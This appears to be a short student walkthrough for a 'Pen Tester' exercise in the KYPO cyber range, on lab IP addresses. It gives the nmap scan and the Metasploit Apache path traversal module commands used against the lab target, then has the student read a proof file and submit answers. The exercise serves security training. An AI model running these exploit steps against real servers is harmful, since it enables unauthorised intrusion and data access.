# Pen Tester Walkthrough

Use this guide for the Pen Tester role.

## Accessing the VM
1. Begin the **Pen Tester** exercise in KYPO.
2. SSH to `attacker` (`10.10.30.10`) with user `kali`.

## Steps
1. Scan the target web server:
   ```bash
   nmap -sV 10.10.10.60
   ```
   - Note the Apache version and add it to KYPO.
2. Launch Metasploit and run the path traversal exploit:
   ```bash
   msfconsole -q
   use exploit/multi/http/apache_path_traversal
   set RHOSTS 10.10.10.60
   run
   ```
   - After success, read `/tmp/proof.txt` and submit the string found in KYPO.

## Documenting Findings
Record the version and proof string in the appropriate answer fields for the **Pen Tester** exercise.
